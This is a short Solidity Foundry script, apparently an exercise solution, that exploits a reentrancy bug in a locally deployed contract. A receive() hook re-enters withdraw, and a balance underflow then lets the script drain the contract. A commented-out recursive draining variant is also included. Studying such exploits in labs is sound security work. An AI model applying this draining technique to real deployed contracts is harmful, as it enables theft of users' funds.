// SPDX-License-Identifier: MIT
pragma solidity >=0.8.10;

import "forge-std/Script.sol";
import "../src/Reentrancy.sol";

contract ReentrancyHack is Script {
    Reentrancy public reentrancy;

    bool private exploited;

    function run() public payable {
        reentrancy = new Reentrancy();
        exploited = false;
        uint256 donateAmount = 1 ether;

        vm.deal(address(reentrancy), 999_999 ether);
        vm.deal(address(this), donateAmount);

        reentrancy.donate{value: donateAmount}(address(this));
        reentrancy.withdraw(donateAmount);

        // using it's underflow to withdraw all ethers
        // just call `reentrancy.withdraw` 3 times.
        reentrancy.withdraw(address(reentrancy).balance);

        console.log(address(reentrancy).balance);
        console.log(address(this).balance);
    }

    receive() external payable {
        if (!exploited) {
            exploited = true;
            reentrancy.withdraw(1 ether);
        }
        // Recursively withdraw
        // uint256 remains = address(reentrancy).balance;
        // if (remains > 0) {
        //     uint256 withdrawAmount = msg.value;
        //     if (withdrawAmount > remains) {
        //         withdrawAmount = remains;
        //     }
        //     reentrancy.withdraw(withdrawAmount);
        // }
    }
}
